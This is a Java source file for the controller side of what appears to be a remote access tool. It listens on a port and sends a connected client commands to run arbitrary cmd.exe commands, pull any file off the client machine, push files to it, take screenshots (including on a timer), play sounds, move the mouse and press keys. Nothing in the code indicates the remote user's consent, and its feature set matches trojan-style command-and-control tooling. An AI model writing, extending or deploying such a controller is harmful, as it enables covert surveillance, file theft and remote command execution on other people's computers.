package serverTest;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;

public class Server {
	
	// Colored output
	public static final String ANSI_RESET = "\u001B[0m";
	public static final String ANSI_ERROR = "\u001B[31m"; // RED
	public static final String ANSI_OK = "\u001B[32m";	  // GREEN
	public static final String ANSI_NOTE = "\u001B[35m";  // PURPLE
	public static final String ANSI_INPUT = "\u001B[36m"; // CYAN
	
	// Scanner for user input
	static Scanner scanIn = new Scanner(System.in);

	// Variables for communication
	static ServerSocket serverSocket;
	static Socket server;
	static DataInputStream in;
	static DataOutputStream out;

	
	public static void main(String[] args) {
		
		// Close all connections when Server is shut down without command
		Runtime.getRuntime().addShutdownHook(new Thread(new Runnable() {
			public void run() {
				try {
					serverSocket.close();
					server.close();
					in.close();
					out.close();
				} catch (Exception e) {
					e.printStackTrace();
				}

			}
		}, "Shutdown-thread"));
		
		
		connectToClient();

		// Accept command from user until exit
		String command;

		while (true) {
			
			System.out.println(ANSI_OK + "Ready for command:" + ANSI_RESET);
			command = scanIn.nextLine();
			
			switch (command) {
			case "cmd":
				cmd();
				break;
			case "upload":
				upload();
				break;
			case "download":
				download();
				break;
			case "screenshot":
				screenshot();
				break;
			case "sound":
				sound();
				break;
			case "autoscreenshot":
				autoScreenshot();
				break;
			case "movemouse":
				moveMouse();
				break;
			case "presskey":
				pressKey();
				break;
			case "help":
				printHelp();
				break;
			case "EXIT_SERVER":
				safeExit();
				break;
			case "EXIT_CLIENT":
				exitClient();
				break;
			default:
				System.out.println(ANSI_ERROR + "No such command, you fool!" + ANSI_RESET);
			}
		}
	}
	

	// Show help menu with all commands
	private static void printHelp() {
		System.out.println(ANSI_OK + "\nLIST OF COMMANDS -------------------------------");
		System.out.println(ANSI_RESET + "cmd" + ANSI_INPUT + "  -  Send cmd commands to client and receive results");
		System.out.println(ANSI_RESET + "upload" + ANSI_INPUT + "  -  Upload file with specified path to client, saved as <fileLen>");
		System.out.println(ANSI_RESET + "download" + ANSI_INPUT + "  -  Download file with specified path from client, saved as <fileLen>");
		System.out.println(ANSI_RESET + "screenshot" + ANSI_INPUT + "  -  Take screenshot and save as <dd_hh_mm_ss>");
		System.out.println(ANSI_RESET + "autoscreenshot" + ANSI_INPUT + "  -  Configure taking screenshots automatically");
		System.out.println(ANSI_RESET + "sound" + ANSI_INPUT + "  -  Play a .wav file on clients computer");
		System.out.println(ANSI_RESET + "movemouse" + ANSI_INPUT + "  -  Move clients mouse, periodically or once");
		System.out.println(ANSI_RESET + "presskey" + ANSI_INPUT + "  -  Simulates keyPressed with given keycode");
		System.out.println(ANSI_RESET + "EXIT_SERVER" + ANSI_INPUT + "  -  Safely close server");
		System.out.println(ANSI_RESET + "EXIT_CLIENT" + ANSI_INPUT + "  -  Safely close client");
		System.out.println(ANSI_OK + "------------------------------------------------\n" + ANSI_RESET);
	}
	
	
	private static void pressKey() {
		System.out.println(ANSI_INPUT + "Enter keycode:" + ANSI_RESET);
		String input = scanIn.nextLine();
		int keyCode;
		
		try {
			keyCode = Integer.parseInt(input);
		} catch (Exception e) {
			System.out.println(ANSI_ERROR + "Not convertible to an integer!" + ANSI_RESET);
			return;
		}
		
		
		try {
			out.writeUTF("presskey");
			out.writeInt(keyCode);
		} catch (Exception e) {
			e.printStackTrace();
			System.out.println(ANSI_ERROR + "Error while sending keyCode!" + ANSI_RESET);
			return;
		}
		System.out.println(ANSI_OK + "Client received keyCode!" + ANSI_RESET);
	}


	private static void moveMouse() {
		try {
			out.writeUTF("movemouse");
		} catch (Exception e) {
			System.out.println(ANSI_ERROR + "Error while sending notification!" + ANSI_RESET);
			return;
		}
		
		System.out.println(ANSI_INPUT + "Enter time between moves, 0 to terminate, or 1 for single run: " + ANSI_RESET);
		int option = scanIn.nextInt();
		scanIn.nextLine();
		
		try {
			out.writeInt(option);
		} catch (Exception e) {
			System.out.println(ANSI_ERROR + "Error while sending option!" + ANSI_RESET);
			return;
		}
		
	}


	private static void autoScreenshot() {
		try {
			out.writeUTF("autoscreenshot");
		} catch (Exception e) {
			System.out.println(ANSI_ERROR + "Error while sending notification!" + ANSI_RESET);
			return;
		}
		
		System.out.println(ANSI_INPUT + "Enter time between screenshots or 0 to terminate Thread: " + ANSI_RESET);
		int timer = scanIn.nextInt();
		scanIn.nextLine();
		
		try {
			out.writeInt(timer);
		} catch (Exception e) {
			System.out.println(ANSI_ERROR + "Error while sending timer!" + ANSI_RESET);
			return;
		}
	}


	// Play sound (.wav)
	private static void sound() {
		System.out.println(ANSI_INPUT + "Enter path to sound file:" + ANSI_RESET);
		String path = scanIn.nextLine();
		
		try {
			out.writeUTF("sound");
			out.writeUTF(path);
		} catch (Exception e) {
			e.printStackTrace();
			System.out.println(ANSI_ERROR + "Error while sending notification!" + ANSI_RESET);
			return;
		}
		System.out.println(ANSI_OK + "Client received notification!" + ANSI_RESET);
	}


	// Save screenshot as "MMDDHHmm"
	private static void screenshot() {
		try {
			out.writeUTF("screenshot");
		} catch (Exception e) {
			System.out.println(ANSI_ERROR + "Error while sending notification!" + ANSI_RESET);
			return;
		}
		System.out.println(ANSI_OK + "Client received notification!" + ANSI_RESET);
	}


	
	private static void exitClient() {
		try {
			out.writeUTF("exit");
		} catch (Exception e) {
			System.out.println(ANSI_ERROR + "Error while sending notification!" + ANSI_RESET);
			return;
		}
		System.out.println(ANSI_OK + "Client received notification!" + ANSI_RESET);
	}

	
	// Exit safely by closing connections
	private static void safeExit() {
		try {
			serverSocket.close();
			server.close();
			in.close();
			out.close();
		} catch (Exception e) {
			System.out.println(ANSI_ERROR + "Error closing connections!" + ANSI_RESET);
			System.exit(1);
		}
		System.exit(0);
	}

	
	// Download file from client, save as <fileLen>
	private static void download() {
		
		// Get file Path
		System.out.println(ANSI_INPUT + "Enter path to file:" + ANSI_RESET);
		String fPath = scanIn.nextLine();
		
		// Send notification and file Path
		try {
			out.writeUTF("send");
			out.writeUTF(fPath);
		} catch (Exception e) {
			System.out.println(ANSI_ERROR + "Error while sending notification and path!" + ANSI_RESET);
			return;
		}
		
		System.out.println(ANSI_OK + "Path " + fPath + " has been send! Receiving file length..." + ANSI_RESET);
		
		// Receive file length
		int fileLen = 0;
		try {
			fileLen = in.readInt();
		} catch (Exception e) {
			System.out.println(ANSI_ERROR + "Error receiving file length!" + ANSI_RESET);
			return;
		}
		
		System.out.println(ANSI_NOTE + fileLen + " Bytes to download..." + ANSI_RESET);
		
		// Prepare writing to new file
		FileOutputStream fos;
		try {
			fos = new FileOutputStream(String.valueOf(fileLen));
		} catch (FileNotFoundException e) {
			e.printStackTrace();
			System.out.println(ANSI_ERROR + "Error creating new file!" + ANSI_RESET);
			return;
		}
		
		// Download and safe file
		int read = 0, remaining = fileLen;
		byte[] buffer = new byte[4096];
		
		System.out.println(ANSI_NOTE + "Downloading..." + ANSI_RESET);
		
		try {
			while((read = in.read(buffer, 0, Math.min(buffer.length, remaining))) > 0) {
				remaining -= read;
				System.out.printf("\r%s%-10s Bytes remaining%s          ", ANSI_NOTE, remaining, ANSI_RESET);
				fos.write(buffer, 0, read);
			}
			fos.close();
		} catch (Exception e) {
			e.printStackTrace();
			System.out.println(ANSI_ERROR + "\nError while receiving and writing file!" + ANSI_RESET);
			return;
		}
		
		System.out.println(ANSI_OK + "\nFile recieved!               " + ANSI_RESET);
	}

	
	// Upload file to client and save as <fileLen>
	private static void upload() {
		
		// Notify client
		try {
			out.writeUTF("receive");
		} catch (Exception e) {
			System.out.println(ANSI_ERROR + "Error sending notification!" + ANSI_RESET);
			return;
		}

		// Get path to file
		System.out.println(ANSI_INPUT + "Enter path to file:" + ANSI_RESET);
		String fPath = scanIn.nextLine();

		// Prepare reading from file
		System.out.println(ANSI_NOTE + "Prepare reading from file..." + ANSI_RESET);
		File file;
		FileInputStream fis;
		int fileLen = 0;
		try {
			file = new File(fPath);
			fis = new FileInputStream(file);
			fileLen = (int) file.length();
		} catch (Exception e) {
			e.printStackTrace();
			System.out.println(ANSI_ERROR + "Could not access File!" + ANSI_RESET);
			return;
		}
		
		// Send file length, read and upload file
		System.out.println(ANSI_NOTE + "Uploading file..." + ANSI_RESET);
		
		byte[] buffer = new byte[fileLen];
		
		try {
			out.writeInt(fileLen);
			while (fis.read(buffer) > 0)
				out.write(buffer);
			fis.close();
		} catch (Exception e) {
			e.printStackTrace();
			System.out.println(ANSI_ERROR + "Error while uploading file!" + ANSI_RESET);
			return;
		}
		
		System.out.println(ANSI_OK + "File uploaded!" + ANSI_RESET);
	}


	// Control cmd.exe
	private static void cmd() {
		try {
			// Notify client
			out.writeUTF("cmd");
			
			// Get and send command
			System.out.println(ANSI_INPUT + "Enter the command to execute:" + ANSI_RESET);
			String command = scanIn.nextLine();
			out.writeUTF(command);

			System.out.println(ANSI_OK + "Command has been send" + ANSI_RESET);

			// Wait for incoming data
			int attempts = 0;
			while (in.available() < 2 && attempts < 1000) {
				Thread.sleep(100);
				attempts++;
			}
			if (attempts == 1000) {
				System.out.println(ANSI_ERROR + "Timeout while waiting for Response!" + ANSI_RESET);
				return;
			}
			
			// Display response
			System.out.println(in.readUTF());
		} catch (Exception e) {
			System.out.println(ANSI_ERROR + "Error during transmissions!" + ANSI_RESET);
			e.printStackTrace();
			return;
		}
	}

	// Establish connection to client
	private static void connectToClient() {

		try {
			System.out.println(ANSI_NOTE + "Starting..." + ANSI_RESET);
			serverSocket = new ServerSocket(6655);
			System.out.println(ANSI_NOTE + "Waiting for client..." + ANSI_RESET);
			server = serverSocket.accept();
			System.out.println(ANSI_OK + "Connection established!" + ANSI_RESET);
			in = new DataInputStream(server.getInputStream());
			out = new DataOutputStream(server.getOutputStream());
		} catch (Exception e) {
			e.printStackTrace();
			System.out.println(ANSI_ERROR + "Connection could not be established!" + ANSI_RESET);
			System.exit(1);
		}
	}
}
